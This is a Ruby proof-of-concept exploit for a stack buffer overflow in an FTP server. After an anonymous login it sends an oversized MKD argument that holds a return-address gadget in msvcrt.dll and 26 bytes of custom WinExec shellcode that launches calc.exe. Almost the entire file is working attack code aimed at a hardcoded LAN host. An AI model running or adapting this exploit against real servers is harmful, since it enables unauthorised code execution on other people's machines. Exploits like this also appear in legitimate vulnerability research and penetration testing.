#!/usr/bin/env ruby

require 'socket'

#----------------------------------------------------------------------------------#
# (*) WinExec                                                                      #
# (*) arwin.exe => Kernel32.dll - WinExec 0x7c8623ad                               #
# (*) MSDN Structure:                                                              #
#                                                                                  #
# UINT WINAPI WinExec(            => PTR to WinExec                                #
#   __in  LPCSTR lpCmdLine,       => calc.exe                                      #
#   __in  UINT uCmdShow           => 0x1                                           #
# );                                                                               #
#                                                                                  #
# Final Size => 26-bytes (metasploit version size => 227-bytes)                    #
#----------------------------------------------------------------------------------#

WinExec = "\x33\xc0"       + # XOR EAX,EAX
"\x50"                     + # PUSH EAX      => padding for lpCmdLine
"\x68\x2E\x65\x78\x65"     + # PUSH ".exe"
"\x68\x63\x61\x6C\x63"     + # PUSH "calc"
"\x8B\xC4"                 + # MOV EAX,ESP
"\x6A\x01"                 + # PUSH 1
"\x50"                     + # PUSH EAX
"\xBB\xAD\x23\x86\x7C"     + # MOV EBX,kernel32.WinExec
"\xFF\xD3"                   # CALL EBX

#----------------------------------------------------------------------------------#
# Badchars: \x00\x0A\x0D                                                           #
# 0x77c35459 : push esp #  ret  | msvcrt.dll                                       #
# shellcode at ESP => space 749-bytes                                              #
#----------------------------------------------------------------------------------#

buffer = "\x90" * 20 + WinExec
evil = "\x41" * 247 + "\x59\x54\xC3\x77" + buffer + "\x43" * (749 - buffer.size)

host = "192.168.0.15"
port = "21"

s = TCPSocket.open(host, port)
s.recv(1024)

s.send("USER anonymous\r\n", 0)
s.recv(1024)
s.send("PASS anonymous\r\n", 0)
s.recv(1024)
s.send("MKD " + evil + "\r\n", 0)
s.recv(1024)
s.send("QUIT\r\n", 0)
s.close